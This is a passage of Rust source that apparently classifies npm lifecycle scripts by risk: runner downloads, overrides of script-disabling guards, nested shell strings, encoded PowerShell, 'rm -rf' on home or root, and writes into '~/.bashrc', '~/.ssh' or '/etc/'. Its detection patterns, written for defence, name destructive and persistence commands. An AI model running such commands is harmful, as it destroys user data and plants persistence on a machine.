        let runs_initializer = subcommand_in(INITIALIZER_VERBS) && second.is_some();
        // The runner's arguments start after the first word spelled like
        // the subcommand, which may be an earlier flag's value.
        let runner_fetches = || {
            subcommand
                .and_then(|subcommand| arguments.position_of(subcommand, start))
                .is_some_and(|index| arguments.runner_fetches_explicitly(index + 1))
        };
        match self {
            Self::Runner => true,
            Self::LocalFirstRunner => arguments.runner_fetches_explicitly(start),
            Self::Npm => {
                subcommand_in(NPM_INSTALL_VERBS)
                    || runs_initializer
                    || (subcommand_in(&["exec", "x"]) && runner_fetches())
            }
            Self::Pnpm => subcommand_in(PNPM_INSTALL_VERBS) || runs_initializer,
            Self::Lpm => subcommand_in(LPM_INSTALL_VERBS),
            Self::SystemInstaller => subcommand_in(&["install"]),
            Self::Bun => {
                subcommand_in(BUN_INSTALL_VERBS)
                    || runs_initializer
                    || (subcommand == Some("pm") && second.is_some_and(|s| words[s] == "trust"))
                    || (subcommand == Some("x") && runner_fetches())
            }
            Self::Deno => {
                subcommand_in(DENO_INSTALL_VERBS)
                    || (subcommand == Some("x") && runner_fetches())
                    || first
                        .is_some_and(|first| arguments.remote_module_from[unknown as usize][first])
            }
            Self::Yarn => {
                let Some(first) = first else {
                    return at_command_position
                        && arguments
                            .next_query_flag
                            .get(start)
                            .copied()
                            .flatten()
                            .is_none();
                };
                let third = second.and_then(|second| positionals.after(second));
                if words[first] == "workspace"
                    && let Some(third) = third
                {
                    YARN_INSTALL_VERBS.contains(&words[third])
                } else if words[first] == "workspaces"
                    && let Some(second) = second
                    && words[second] == "foreach"
                {
                    third.is_some_and(|rest| {
                        arguments.yarn_install_verb_from[unknown as usize][rest]
                    })
                } else {
                    subcommand_in(YARN_INSTALL_VERBS) || runs_initializer
                }
            }
        }
    }
}

/// `npx` / `bunx` / `npm exec` run an installed binary when the package
/// is local, and download it otherwise; lifecycle scripts have no TTY,
/// so npm assumes `--yes`. From the script text alone, only an explicit
/// download request can be told apart from a local tool like `npx tsc`.
fn is_download_request(arg: &str) -> bool {
    matches!(arg, "-y" | "--yes" | "-p" | "--package") || arg.starts_with("--package=")
}

/// `name@1.2.3`, `@scope/name@latest`, `npm:x`, `github:x`, URLs and
/// `file:` specs name a download target instead of a local binary.
fn is_explicit_package_spec(spec: &str) -> bool {
    spec.get(1..).is_some_and(|rest| rest.contains('@')) || spec.contains(':')
}

/// `--version` / `--help` answer and exit instead of running the
/// command's default action (a bare `yarn` installs).
fn is_query_flag(arg: &str) -> bool {
    matches!(arg, "--version" | "-v" | "-V" | "--help" | "-h")
}

fn is_remote_module_specifier(arg: &str) -> bool {
    ["npm:", "jsr:", "http://", "https://"]
        .iter()
        .any(|scheme| arg.starts_with(scheme))
}

/// Flags and environment assignments that switch dependency lifecycle
/// scripts back on, or approve them, for a nested package manager.
/// LPM sets `npm_config_ignore_scripts` / `pnpm_config_ignore_scripts`
/// / `YARN_ENABLE_SCRIPTS` for every dependency script; a script that
/// overrides them is deliberately reopening that door.
fn has_script_policy_override(words: &Words<'_>) -> bool {
    words.words.iter().any(|token| {
        let token = token.to_ascii_lowercase();
        is_script_approval_flag(&token)
            || is_script_policy_assignment(&token)
            || is_powershell_guard_reference(&token)
    }) || removes_script_guard(words)
}

/// Variables LPM sets to keep nested installs from running scripts.
const SCRIPT_GUARD_VARIABLES: &[&str] = &[
    "npm_config_ignore_scripts",
    "pnpm_config_ignore_scripts",
    "yarn_enable_scripts",
    "yarn_ignore_scripts",
];

fn is_script_guard_variable(name: &str) -> bool {
    SCRIPT_GUARD_VARIABLES
        .iter()
        .any(|guard| name.eq_ignore_ascii_case(guard))
}

/// `$env:npm_config_ignore_scripts = …` / `Remove-Item Env:…` inside a
/// PowerShell command string.
fn is_powershell_guard_reference(token: &str) -> bool {
    ["$env:", "env:"].iter().any(|prefix| {
        token.strip_prefix(prefix).is_some_and(|rest| {
            SCRIPT_GUARD_VARIABLES
                .iter()
                .any(|guard| rest.starts_with(guard))
        })
    })
}

/// `unset npm_config_ignore_scripts`, `env -u npm_config_ignore_scripts …`
/// and `env -i …` drop the guard as surely as setting it to `false`.
fn removes_script_guard(words: &Words<'_>) -> bool {
    let has = |command: &str| words.names.iter().any(|name| name == command);
    if !has("unset") && !has("env") {
        return false;
    }
    let next_guard = words.next_matching(is_script_guard_variable);
    // `env_drops_guard[k]`: `env` drops a guard when its options start
    // at `k`. `env` reads options until its command, and an option such
    // as `-u` takes the next word, which may itself be spelled `env`.
    let mut env_drops_guard = vec![false; words.len() + 2];
    for index in (0..words.len()).rev() {
        if !words.is_argument(index) {
            continue;
        }
        let arg = words.words[index];
        env_drops_guard[index] = match arg {
            "-i" | "--ignore-environment" | "-" => true,
            "-u" | "--unset" => {
                words.is_argument(index + 1)
                    && (is_script_guard_variable(words.words[index + 1])
                        || env_drops_guard[index + 2])
            }
            _ if arg.starts_with("--unset=") => {
                is_script_guard_variable(&arg["--unset=".len()..]) || env_drops_guard[index + 1]
            }
            _ if arg.starts_with("-u") => {
                is_script_guard_variable(&arg[2..]) || env_drops_guard[index + 1]
            }
            _ if arg.starts_with('-') || is_environment_assignment(arg) => {
                env_drops_guard[index + 1]
            }
            _ => false,
        };
    }
    words
        .names
        .iter()
        .enumerate()
        .any(|(index, name)| match name.as_str() {
            "unset" => next_guard[index + 1].is_some(),
            "env" => env_drops_guard[index + 1],
            _ => false,
        })
}

fn is_script_approval_flag(token: &str) -> bool {
    let Some(flag) = token.strip_prefix("--") else {
        return false;
    };
    let flag = flag.strip_prefix("config.").unwrap_or(flag);
    let (name, value) = match flag.split_once('=') {
        Some((name, value)) => (name, Some(value)),
        None => (flag, None),
    };
    match name {
        "allow-scripts"
        | "allow-build"
        | "dangerously-allow-all-builds"
        | "dangerously-allow-all-scripts"
        | "no-ignore-scripts" => true,
        "ignore-scripts" => value.is_some_and(|value| !is_truthy(value)),
        _ => false,
    }
}

fn is_script_policy_assignment(token: &str) -> bool {
    let Some((name, value)) = token.split_once('=') else {
        return false;
    };
    match name {
        "npm_config_ignore_scripts" | "pnpm_config_ignore_scripts" | "yarn_ignore_scripts" => {
            !is_truthy(value)
        }
        "yarn_enable_scripts" => !matches!(value, "false" | "0"),
        "npm_config_dangerously_allow_all_scripts" | "pnpm_config_dangerously_allow_all_builds" => {
            !matches!(value, "false" | "0" | "")
        }
        "npm_config_allow_scripts" | "pnpm_config_allow_builds" => !value.is_empty(),
        _ => false,
    }
}

fn is_truthy(value: &str) -> bool {
    matches!(value, "true" | "1")
}

/// Shell nesting beyond this depth is treated as obfuscation.
const MAX_SHELL_COMMAND_DEPTH: usize = 4;

/// `sh -c '<body>'`, `bash -o pipefail -c '<body>'`, `cmd /c "<body>"`,
/// `pwsh -Command '<body>'` and `npx -c '<body>'`: the body is a single
/// token to the outer tokenizer, so a red command inside it would
/// otherwise read as an opaque argument. An encoded PowerShell command
/// cannot be read at all and is red on its own.
fn has_red_shell_command_string(words: &Words<'_>, depth: usize) -> bool {
    let commands: Vec<usize> = (0..words.len())
        .filter(|&index| runs_command_string(&words.names[index]))
        .collect();
    if commands.is_empty() {
        return false;
    }
    let strings = CommandStrings::new(words);
    // Several command words can lead to the same body (`sh -o sh -c
    // '<body>'`), and reading a body is linear in its length, so each
    // one is read once.
    let mut read = std::collections::HashSet::new();
    for index in commands {
        match strings.command_string(&words.names[index], index + 1) {
            Some(CommandString::Encoded) => return true,
            Some(CommandString::Body(body)) => {
                if !read.insert(body) {
                    continue;
                }
                if depth >= MAX_SHELL_COMMAND_DEPTH
                    || script_is_red(&words.words[body.word][body.offset..], depth + 1)
                {
                    return true;
                }
            }
            None => {}
        }
    }
    false
}

const POSIX_SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish"];

/// Whether [`CommandStrings::command_string`] can find a command string
/// for a command with this [`command_name`].
fn runs_command_string(command: &str) -> bool {
    POSIX_SHELLS.contains(&command)
        || matches!(
            command,
            "cmd" | "pwsh" | "powershell" | "npx" | "npx-cli.js" | "npm" | "npm-cli.js"
        )
}

/// A command string: the text of a word, from a byte offset on.
#[derive(Clone, Copy, PartialEq, Eq, Hash)]
struct CommandBody {
    word: usize,
    offset: usize,
}

impl CommandBody {
    fn word(word: usize) -> Self {
        Self { word, offset: 0 }
    }
}

#[derive(Clone, Copy)]
enum CommandString {
    Body(CommandBody),
    Encoded,
}

/// Where the command string of a shell, `cmd`, PowerShell or a package
/// runner is, for the arguments that start at each position.
struct CommandStrings<'w, 'a> {
    words: &'w Words<'a>,
    posix: Vec<Option<CommandBody>>,
    powershell: Vec<Option<CommandString>>,
    next_cmd_switch: Vec<Option<usize>>,
    next_runner_call: Vec<Option<usize>>,
    positionals: Positionals,
}

impl<'w, 'a> CommandStrings<'w, 'a> {
    fn new(words: &'w Words<'a>) -> Self {
        Self {
            words,
            posix: posix_command_strings(words),
            powershell: powershell_command_strings(words),
            next_cmd_switch: words.next_matching(|arg| {
                arg.eq_ignore_ascii_case("/c") || arg.eq_ignore_ascii_case("/k")
            }),
            next_runner_call: words.next_matching(|arg| {
                matches!(arg, "--" | "-c" | "--call") || arg.starts_with("--call=")
            }),
            positionals: Positionals::new(words, UnknownFlags::TakeNoValue),
        }
    }

    /// The command string `command` is told to execute when its
    /// arguments start at `start`, if any.
    fn command_string(&self, command: &str, start: usize) -> Option<CommandString> {
        match command {
            shell if POSIX_SHELLS.contains(&shell) => self.posix[start].map(CommandString::Body),
            "cmd" => {
                let switch = self.next_cmd_switch[start]?;
                self.words
                    .is_argument(switch + 1)
                    .then(|| CommandString::Body(CommandBody::word(switch + 1)))
            }
            "pwsh" | "powershell" => self.powershell[start],
            "npx" | "npx-cli.js" => self.runner_call_body(start).map(CommandString::Body),
            "npm" | "npm-cli.js"
                if self
                    .positionals
                    .first(start)
                    .is_some_and(|first| matches!(self.words.words[first], "exec" | "x")) =>
            {
                self.runner_call_body(start).map(CommandString::Body)
            }
            _ => None,
        }
    }

    /// The `-c` / `--call` body an `npx` / `npm exec` runner executes.
    fn runner_call_body(&self, start: usize) -> Option<CommandBody> {
        let call = self.next_runner_call[start]?;
        let arg = self.words.words[call];
        if arg == "--" {
            return None;
        }
        if arg.starts_with("--call=") {
            return Some(CommandBody {
                word: call,
                offset: "--call=".len(),
            });
        }
        (self.words.is_argument(call + 1) && self.words.words[call + 1] != "--")
            .then(|| CommandBody::word(call + 1))
    }
}

/// For each position, the `-c` body of a POSIX shell whose options start
/// there, after any other options (`-e`, `-o pipefail`, `--login`) and
/// an optional `--` that follows `-c`.
fn posix_command_strings(words: &Words<'_>) -> Vec<Option<CommandBody>> {
    let mut body = vec![None; words.len() + 2];
    for index in (0..words.len()).rev() {
        if !words.is_argument(index) {
            continue;
        }
        let arg = words.words[index];
        body[index] = match arg {
            "--" => None,
            "-o" | "+o" | "-O" | "+O" => {
                if words.is_argument(index + 1) {
                    body[index + 2]
                } else {
                    None
                }
            }
            _ if arg.starts_with("--") || arg.starts_with('+') => body[index + 1],
            _ if arg.starts_with('-') => {
                if !arg.contains('c') {
                    body[index + 1]
                } else if !words.is_argument(index + 1) {
                    None
                } else if words.words[index + 1] == "--" {
                    words
                        .is_argument(index + 2)
                        .then(|| CommandBody::word(index + 2))
                } else {
                    Some(CommandBody::word(index + 1))
                }
            }
            _ => None,
        };
    }
    body
}

/// For each position, the command string of `pwsh` / `powershell` whose
/// options start there: the value of `-Command` (or any prefix of it,
/// `-c` included), or the first non-option argument, which Windows
/// PowerShell runs as a command. `-EncodedCommand` (`-e`, `-ec`, `-enc`,
/// …) is reported as encoded; `-File` runs a file.
fn powershell_command_strings(words: &Words<'_>) -> Vec<Option<CommandString>> {
    const VALUE_OPTIONS: &[&str] = &[
        "executionpolicy",
        "ep",
        "ex",
        "workingdirectory",
        "wd",
        "configurationname",
        "cnf",
        "inputformat",
        "if",
        "outputformat",
        "of",
        "settingsfile",
    ];
    let mut command = vec![None; words.len() + 2];
    for index in (0..words.len()).rev() {
        if !words.is_argument(index) {
            continue;
        }
        let arg = words.words[index];
        let Some(option) = arg.strip_prefix('-').or_else(|| arg.strip_prefix('/')) else {
            command[index] = Some(CommandString::Body(CommandBody::word(index)));
            continue;
        };
        let option = option.to_ascii_lowercase();
        let abbreviates = |full: &str| !option.is_empty() && full.starts_with(option.as_str());
        command[index] = if abbreviates("encodedcommand") || option == "ec" {
            Some(CommandString::Encoded)
        } else if abbreviates("command") || abbreviates("commandwithargs") || option == "cwa" {
            words
                .is_argument(index + 1)
                .then(|| CommandString::Body(CommandBody::word(index + 1)))
        } else if abbreviates("file") {
            None
        } else if !VALUE_OPTIONS.contains(&option.as_str()) {
            command[index + 1]
        } else if words.is_argument(index + 1) {
            command[index + 2]
        } else {
            None
        };
    }
    command
}

fn script_is_red(script: &str, depth: usize) -> bool {
    if contains_unicode_control_chars(script) || contains_powershell_red_literal(script) {
        return true;
    }
    let normalized = normalize_operators(script);
    shlex::split(&normalized).is_some_and(|tokens| normalized_is_red(&normalized, &tokens, depth))
}

/// POSIX tokenizing drops backslashes, but cmd.exe runs lifecycle
/// scripts on Windows and treats them as path separators, so
/// `node_modules\.bin\npm.cmd install x` gets a second, red-only pass
/// with backslashes read as `/`.
fn normalized_is_red(normalized: &str, tokens: &[String], depth: usize) -> bool {
    words_match_red_at(&Words::new(tokens), depth)
        || (normalized.contains('\\')
            && shlex::split(&normalized.replace('\\', "/"))
                .is_some_and(|tokens| words_match_red_at(&Words::new(&tokens), depth)))
}

/// `rm -rf ~` / `rm -rf /` / `rm -rf $HOME` / `rm -rf *` and close
/// variants. We require BOTH `-r` and `-f` (in any flag spelling)
/// before considering targets — `rm foo.txt` without `-r` is not in
/// this red class.
fn has_dangerous_rm(words: &Words<'_>) -> bool {
    if !words.words.contains(&"rm") {
        return false;
    }
    // Read right to left, so the flags and targets after each position
    // are known when an `rm` is reached.
    let (mut recursive, mut force, mut dangerous_target) = (false, false, false);
    for (index, word) in words.words.iter().enumerate().rev() {
        if words.operators[index] {
            (recursive, force, dangerous_target) = (false, false, false);
            continue;
        }
        if *word == "rm" && recursive && force && dangerous_target {
            return true;
        }
        let Some(flag) = word.strip_prefix('-') else {
            dangerous_target |= is_dangerous_rm_target(word);
            continue;
        };
        if flag.is_empty() || flag == "-" {
            continue;
        }
        // Long-form `--recursive` / `--force`.
        if flag == "-recursive" || flag == "recursive" {
            recursive = true;
            continue;
        }
        if flag == "-force" || flag == "force" {
            force = true;
            continue;
        }
        // Short-form clusters like `-rf`, `-fr`, `-Rf`.
        for c in flag.chars() {
            recursive |= c == 'r' || c == 'R';
            force |= c == 'f';
        }
    }
    false
}

fn is_dangerous_rm_target(target: &str) -> bool {
    // Exact matches for the canonical dangerous targets.
    if matches!(target, "/" | "~" | "*" | "/*" | "~/" | "~/*" | "./*") {
        return true;
    }
    // Home-dir-anchored — `~`, `$HOME`, `${HOME}`, `${HOME:-/root}`.
    if target.starts_with('~') || target.starts_with("$HOME") || target.starts_with("${HOME") {
        return true;
    }
    // Any absolute path is dangerous — a postinstall should never be
    // rm -rf'ing outside the package directory.
    if target.starts_with('/') {
        return true;
    }
    // Bare glob that'd expand in the CWD (typically the project dir).
    if target == "*" {
        return true;
    }
    false
}

/// `chmod +x` / `chmod 777` applied to a target outside the package
/// directory. Conservative: we treat any absolute path, `~`-anchored
/// path, or `$HOME`-anchored path as "outside" — we can't prove
/// anything further from the script text alone. Relative paths skip
/// the red classification (they might still land in Amber via the
/// generic fallback).
fn has_dangerous_chmod(words: &Words<'_>) -> bool {
    if !words.words.contains(&"chmod") {
        return false;
    }
    // Read right to left, so the modes and targets after each position
    // are known when a `chmod` is reached. Some chmod implementations
    // accept flags like `-R`; they're opaque, neither mode nor target.
    let (mut dangerous_mode, mut outside_target) = (false, false);
    for (index, word) in words.words.iter().enumerate().rev() {
        if words.operators[index] {
            (dangerous_mode, outside_target) = (false, false);
            continue;
        }
        if *word == "chmod" && dangerous_mode && outside_target {
            return true;
        }
        if is_dangerous_chmod_mode(word) {
            dangerous_mode = true;
        } else if !word.starts_with('-') {
            outside_target |= is_outside_package_target(word);
        }
    }
    false
}

fn is_dangerous_chmod_mode(m: &str) -> bool {
    // `+x`, `a+x`, `u+x`, `ugo+x`, `755`, `777`, leading-zero forms.
    if m == "+x" {
        return true;
    }
    if m.ends_with("+x") && m.len() <= 5 {
        // Short symbolic modes like `a+x`, `u+x`, `ugo+x`.
        return true;
    }
    matches!(m, "777" | "0777" | "755" | "0755")
}

fn is_outside_package_target(target: &str) -> bool {
    target.starts_with('~')
        || target.starts_with('/')
        || target.starts_with("$HOME")
        || target.starts_with("${HOME")
}

/// `>> ~/.bashrc` / `>> ~/.ssh/authorized_keys` / `> /etc/...` —
/// persistence-establishing redirects into user dotfiles or privileged
/// system paths. A postinstall writing into these locations is
/// malware-shaped regardless of what's being written.
fn has_dangerous_redirect(words: &Words<'_>) -> bool {
    for (i, t) in words.words.iter().enumerate() {
        if *t != ">>" && *t != ">" {
            continue;
        }
        let Some(target) = words.words.get(i + 1) else {
            continue;
        };
        if is_dangerous_redirect_target(target) {
            return true;
        }
    }
    false
}

fn is_dangerous_redirect_target(target: &str) -> bool {
    const EXACT: &[&str] = &[
        "~/.bashrc",
        "~/.bash_profile",
        "~/.zshrc",
        "~/.zprofile",
        "~/.zshenv",
        "~/.profile",
        "~/.bash_login",
        "~/.bash_logout",
    ];
    if EXACT.contains(&target) {
        return true;
    }
    if target.starts_with("~/.ssh") {
        return true;
    }
    if target.starts_with("/etc/") || target.starts_with("/root/") {
        return true;
    }
    // `$HOME/.bashrc` and friends.
    if target.starts_with("$HOME/.") || target.starts_with("${HOME}/.") {
        return true;
    }
    false
}

// ─────────────────────────────────────────────────────────────────────
// Step 4 — compound detection
// ─────────────────────────────────────────────────────────────────────

/// A compound operator token. `shlex` doesn't understand shell
/// operators, so these appear as regular tokens (e.g. `"&&"`, `"|"`,
/// `">"`); we detect them by exact match. Subshell parens and backtick
/// command-substitution sit as **part of** tokens (since shlex treats
/// them as ordinary characters), so we also look for `$(` and `` ` ``
/// inside token contents.
fn is_compound_op(t: &str) -> bool {
    match t {
        "&&" | "||" | ";" | "|" | ">" | ">>" | "<" | "<<" | "&" | "(" | ")" => true,
        _ => t.contains("$(") || t.contains('`'),
    }
}

fn tokens_are_compound(tokens: &[String]) -> bool {
    tokens.iter().any(|t| is_compound_op(t))
}

// ─────────────────────────────────────────────────────────────────────
// Step 5 — green allowlist
// ─────────────────────────────────────────────────────────────────────

fn tokens_match_green(tokens: &[String], script: &str) -> bool {
    match tokens.first().map(String::as_str) {
        Some("node-gyp") => matches_node_gyp(tokens),
        Some("node-gyp-build") => tokens.len() == 1,
        Some("node-gyp-build-optional-packages") => tokens.len() == 1,
        Some("electron-rebuild") => tokens.len() == 1,
        Some("tsc") => matches_tsc(tokens),
        Some("prisma") => matches_prisma(tokens),
        Some("husky") => matches_husky(tokens),
        Some("node") => matches_node_relative(script) || matches_node_eval_softfail_green(script),
        Some("exit") => matches_exit_noop(tokens),
        Some(":") => tokens.len() == 1,
        Some("echo") => matches_echo_noop(tokens, script),
        _ => false,
    }
}

/// `exit` (no args) or `exit 0` — script-body no-op. Many native-
/// binding packages (e.g. `@datadog/native-*`) ship this as a
/// placeholder preinstall to satisfy npm's lifecycle-script schema
/// while the real work happens via optional platform dependencies.
fn matches_exit_noop(tokens: &[String]) -> bool {
    match tokens.len() {
        1 => true,
        2 => tokens[1] == "0",
        _ => false,
    }
}

/// `echo` (no args, prints newline) or `echo <static-literal>` —
/// trivially safe.
///
/// **Strict guard** on the single-argument form: the literal must NOT
/// be a flag (`-e`, `-n`, …), must not contain `$` (variable
/// expansion / command substitution sigil), backticks (command
/// substitution), or backslash (escape sequences). Multi-argument
/// forms stay amber. The audit-found case `echo 'preinstall: no-op'`
/// passes the guards (shlex strips the quotes, the literal contains
/// only printable ASCII and a colon).
///
/// Takes the raw script too because shlex CONSUMES unquoted
/// backslashes during tokenization (the user's `echo a\nb` arrives
/// here as `["echo", "anb"]` — the token-level check can't see the
/// backslash). Inspecting the raw script catches that case.
fn matches_echo_noop(tokens: &[String], script: &str) -> bool {
    // Raw-script backslash check: shlex would have eaten the escape
    // during tokenization, so any unquoted `\` in the body means the
    // green rule's "no backslashes" guard is violated.
    if script.contains('\\') {
        return false;
    }
    match tokens.len() {
        1 => true,
        2 => is_static_echo_literal(&tokens[1]),
        _ => false,
    }
}

/// Per-token guard for the single-argument `echo` green path.
/// Conservative: anything that could trigger shell expansion or
/// command substitution stays amber.
fn is_static_echo_literal(arg: &str) -> bool {
    if arg.starts_with('-') {
        return false;
    }
    if arg.contains('$') || arg.contains('`') || arg.contains('\\') {
        return false;
    }
    true
}

/// `node-gyp rebuild` with optional `--release` / `--debug`.
fn matches_node_gyp(tokens: &[String]) -> bool {
    if tokens.len() < 2 || tokens[1] != "rebuild" {
        return false;
    }
    tokens
        .iter()
        .skip(2)
        .all(|t| t == "--release" || t == "--debug")
}

/// `tsc`, `tsc --build`, `tsc -b`, `tsc -p <relative>`,
/// `tsc --project <relative>`.
fn matches_tsc(tokens: &[String]) -> bool {
    match tokens.len() {
        1 => true,
        2 => matches!(tokens[1].as_str(), "--build" | "-b"),
        3 => matches!(tokens[1].as_str(), "-p" | "--project") && is_safe_relative_path(&tokens[2]),
        _ => false,
    }
}

/// `prisma generate`.
fn matches_prisma(tokens: &[String]) -> bool {
    tokens.len() == 2 && tokens[1] == "generate"
}

/// `husky` (v9+ form) or `husky install` (v8 form).
fn matches_husky(tokens: &[String]) -> bool {
    match tokens.len() {
        1 => true,
        2 => tokens[1] == "install",
        _ => false,
    }
}

/// `node <relative>.js` (or `.cjs` / `.mjs`) where `<relative>` is a
/// non-escaping path inside the package directory AND the basename is
/// not one of the reserved lifecycle basenames (see
/// [`is_reserved_lifecycle_basename`] — the amber exception wins).
///
/// Dispatches through the shared [`extract_delegate_match`] recogniser
/// and applies the bare-shape + non-reserved-basename tier rule.
fn matches_node_relative(body: &str) -> bool {
    let Some(m) = extract_delegate_match(body) else {
        return false;
    };
    if !matches!(m.shape, DelegateShape::Bare) {
        return false;
    }
    let basename = m.path.rsplit('/').next().unwrap_or(&m.path);
    !is_reserved_lifecycle_basename(basename)
}

/// Lifecycle-phase basenames that trigger the reserved-basename
/// amber rule. Any `node <path>` green candidate whose target basename
/// matches one of these stays amber so the user explicitly
/// acknowledges the binary-download risk, even when the rest of the
/// command is otherwise green-eligible.
///
/// The list covers all three module-extension variants (`.js`,
/// `.cjs`, `.mjs`) for `install`, `postinstall`, and `preinstall` —
/// the audit surfaced popular packages using each non-`.js` variant
/// (puppeteer's `install.mjs`, @anthropic-ai/claude-code's
/// `install.cjs`, dd-trace's `scripts/preinstall.js`).
///
/// **Shared between two routes.** Both [`matches_node_relative`] and
/// [`matches_node_eval_softfail_green`] dispatch through this helper
/// to keep the direct-`node` and softfail-wrapper green paths in
/// lockstep. Adding a basename in only one of the two callers would
/// recreate the drift this helper exists to prevent.
fn is_reserved_lifecycle_basename(basename: &str) -> bool {
    matches!(
        basename,
        "install.js"
            | "install.cjs"
            | "install.mjs"
            | "postinstall.js"
            | "postinstall.cjs"
            | "postinstall.mjs"
            | "preinstall.js"
            | "preinstall.cjs"
            | "preinstall.mjs"
    )
}

/// `node -e "<safe softfail wrapper>"` lands here when:
/// - the eval'd body matches one of the two accepted softfail shapes,
/// - the inner path is safe-relative (no `..`, no abs, no `~`/`$`),
/// - the inner path has an explicit `.js` / `.cjs` / `.mjs` extension, AND
/// - the basename is **not** one of the reserved lifecycle basenames
///   (see [`is_reserved_lifecycle_basename`] — the amber exception
///   wins even when the require is wrapped in a softfail catch).
///
/// Default-amber rule: if any
/// of the above conditions fails, the script falls through to the
/// generic amber bucket. That keeps extensionless paths
/// (`./postinstall`, `./_postinstall`, `./dist/bin/post-install`) and
/// reserved-basename paths (`./scripts/postinstall.js`) out of green
/// even when the wrapper shape itself is recognized.
fn matches_node_eval_softfail_green(body: &str) -> bool {
    let Some(m) = extract_delegate_match(body) else {
        return false;
    };
    if !matches!(m.shape, DelegateShape::SoftfailWrapper) {
        return false;
    }
    let basename = m.path.rsplit('/').next().unwrap_or(&m.path);
    !is_reserved_lifecycle_basename(basename)
}

/// A path is "safe relative" if it points inside the package
/// directory without absolute-path / home-dir / env-var shortcuts
/// and without `..` escape segments.
fn is_safe_relative_path(p: &str) -> bool {
    if p.is_empty()
        || p.starts_with('/')
        || p.starts_with('~')
        || p.starts_with('$')
        || p.contains('\\')
    {
        return false;
    }
    p.split('/').all(|seg| seg != "..")
}

/// Which delegate shape [`extract_delegate_match`] recognised. The
/// classifier's per-shape tier rules (bare-delegate vs softfail
/// wrapper) branch on this, while consumers that only care about the
/// in-package path drop it via [`extract_delegate_path`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DelegateShape {
    /// `node <path>` — two POSIX-shell tokens. Recognised by
    /// [`matches_node_relative`] (non-reserved basename → Green
    /// unconditionally) and by [`matches_delegating_identity_green`]
    /// (reserved basename + identity match → Green).
    Bare,
    /// `node -e <body>` / `node --eval <body>` — three tokens where
    /// `<body>` matches one of the [`parse_softfail_wrapper`] shapes.
    /// Recognised by [`matches_node_eval_softfail_green`]
    /// (non-reserved basename → Green; reserved basename → Amber).
    SoftfailWrapper,
}

/// A delegate-shape match: the in-package relative path the script
/// delegates to, plus the shape the recogniser identified.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DelegateMatch {
    pub path: String,
    pub shape: DelegateShape,
}

/// Recognise any script body shape this module classifies as a
/// delegate-to-local-file and return both the in-package path and
/// the shape that matched. `None` for anything else.
///
/// This is the **single source of truth** for delegate recognition.
/// Every classifier branch that grants Green via a delegate shape
/// ([`matches_node_relative`], [`matches_delegating_identity_green`],
/// [`matches_node_eval_softfail_green`]) dispatches through this
/// function, then applies its specific tier rules to the returned
/// shape and path. The script-hash binding
/// (`lpm_security::script_hash::compute_script_hash`) and the
/// advisor embed-view (`lpm_cli::build_state::parse_delegated_paths`)
/// also read through this function. Drift between the classifier
/// and the recogniser is structurally impossible because there's
/// only one recogniser.
///
/// Recognition rules (apply to both shapes):
///
/// - Path must be safe-relative (no absolute, no `..`, no `~`/`$`).
/// - Path must end in `.js` / `.cjs` / `.mjs`. Extensionless require
///   resolution (`./X` resolving to `X.js` / `X.json` / `X/index.js`)
///   is ambiguous; the hash cannot deterministically pick a file to
///   bind, so the classifier leaves these out of Green too.
///
/// Adding a new delegate shape is a one-line change here (new arm in
/// the token-pattern match below). The classifier's per-shape tier
/// rules pick the new shape up automatically; the script-hash binding
/// picks it up via [`extract_delegate_path`]. The coverage test
/// (`compute_script_hash_binds_delegate_for_every_greenlit_node_path_spelling`)
/// must also gain the new spelling so the binding is exercised
/// against benign-vs-malicious file pairs end-to-end.
pub fn extract_delegate_match(body: &str) -> Option<DelegateMatch> {
    let tokens = shlex::split(body)?;
    let (path, shape) = match tokens.as_slice() {
        // Bare delegate: `node <path>`
        [n, p] if n == "node" => (p.clone(), DelegateShape::Bare),
        // Softfail wrapper: `node -e <body>` or `node --eval <body>`
        [n, e, wrapper] if n == "node" && (e == "-e" || e == "--eval") => (
            parse_softfail_wrapper(wrapper)?,
            DelegateShape::SoftfailWrapper,
        ),
        _ => return None,
    };
    if !is_safe_relative_path(&path) {
        return None;
    }
    if !(path.ends_with(".js") || path.ends_with(".cjs") || path.ends_with(".mjs")) {
        return None;
    }
    Some(DelegateMatch { path, shape })
}

/// Thin wrapper over [`extract_delegate_match`] that drops the shape
/// info. Used by call sites that only need the in-package path
/// (script-hash binding, advisor embed-view).
pub fn extract_delegate_path(body: &str) -> Option<String> {
    extract_delegate_match(body).map(|m| m.path)
}

// ─────────────────────────────────────────────────────────────────────
// Delegate-to-local-file with matching identity
// ─────────────────────────────────────────────────────────────────────

/// Step 5b: detect `node <path>.js` where `<path>` is a reserved
/// lifecycle basename (`install.js`, `postinstall.js`, etc., plus
/// the .cjs/.mjs variants), AND the package's manifest carries an
/// identity signal that pairs with the delegate.
///
/// "Identity signal" means EITHER:
///
/// - The package's base name (last segment of a scoped name) appears
///   as a path segment of the `repository` URL — e.g. the body
///   `node install.js` from a package named `sharp` whose repo URL
///   contains `/sharp` or `/sharp.git`. This pairs the local
///   installer script with the canonical-looking source repository.
///
/// - The package exposes a `bin` entry whose name matches the
///   package's base name — e.g. `lpm-cli` exposing a `bin: { lpm:
///   "..."}`. The presence of a CLI binary named after the package
///   is a strong "this package ships a runtime artifact" signal that
///   pairs naturally with a postinstall fetcher.
///
/// Why this is safe enough for L1 Green:
///
/// - The matched shape is **only the script line** `node <reserved>.js`
///   — no compound, no flags, no extra tokens. Compound bodies stay
///   Amber via step 4; multi-token bodies stay Amber via
///   [`matches_node_relative`]'s `tokens.len() == 2` guard.
/// - The delegated file's actual bytes live in the package store and
///   can still be reviewed by `lpm approve-scripts`. The Green
///   widening just changes the default from "always prompt" to
///   "auto-run when shape + identity agree."
/// - A malicious package CAN lie about its repository field. The
///   counter-measure is that `lpm approve-scripts` embeds the
///   delegate file's actual content in the review prompt — the lie
///   is one step removed from the payload, which the user sees
///   directly. This check alone trusts the field; the user-explicit
///   `lpm approve-scripts` review remains the safety floor.
fn matches_delegating_identity_green(body: &str, ctx: &ManifestContext<'_>) -> bool {
    let Some(m) = extract_delegate_match(body) else {
        return false;
    };
    // Only the bare-delegate shape participates in the identity-match
    // widening today. Extending the widening to the softfail-wrapper
    // shape would be a deliberate policy change — leave that to a
    // separate, explicitly-reviewed update.
    if !matches!(m.shape, DelegateShape::Bare) {
        return false;
    }
    let basename = m.path.rsplit('/').next().unwrap_or(&m.path);
    // Only fire on the reserved-basename set — install.js /
